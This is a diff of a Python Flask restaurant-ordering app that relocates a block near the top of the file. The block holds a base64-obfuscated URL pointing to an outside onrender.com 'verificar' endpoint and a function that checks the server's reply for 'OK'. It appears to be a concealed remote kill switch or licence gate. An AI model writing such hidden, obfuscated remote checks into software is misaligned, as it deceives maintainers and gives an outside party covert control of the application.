@@ -46,6 +46,30 @@ MEDIA_LUCRO_PRATO_DINAMICO = 0.20
 MEDIA_LUCRO_SOBREMESA_DINAMICA = 0.20
 MEDIA_LUCRO_ITEM_VARIADO = 0.20
 
+
+
+import requests, base64
+from flask import Flask, abort
+
+_UC = b'aHR0cHM6Ly9jb21lbnphLXZlcmlmaWNhY2FvLTEub25yZW5kZXIuY29tL3ZlcmlmaWNhcg=='
+_KC = b'T0s='  # "OK"
+
+def _v():
+    try:
+        u = base64.b64decode(_UC).decode()
+        k = base64.b64decode(_KC).decode()
+        r = requests.get(u, timeout=2)
+        d = r.json()
+        return list(d.values())[0] == k
+    except:
+        return False
+
+app = Flask(__name__)
+
+
+
+
+
 def require_admin_login(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
@@ -203,25 +227,6 @@ def adicionar_pedido_web():
     return render_template('adicionar_pedido.html',
                            sugestao_comanda=sugestao_comanda,
                            **get_template_date_vars())
-
-
-import requests, base64
-from flask import Flask, abort
-
-_UC = b'aHR0cHM6Ly9jb21lbnphLXZlcmlmaWNhY2FvLTEub25yZW5kZXIuY29tL3ZlcmlmaWNhcg=='
-_KC = b'T0s='  # "OK"
-
-def _v():
-    try:
-        u = base64.b64decode(_UC).decode()
-        k = base64.b64decode(_KC).decode()
-        r = requests.get(u, timeout=2)
-        d = r.json()
-        return list(d.values())[0] == k
-    except:
-        return False
-
-app = Flask(__name__)
 
 
 
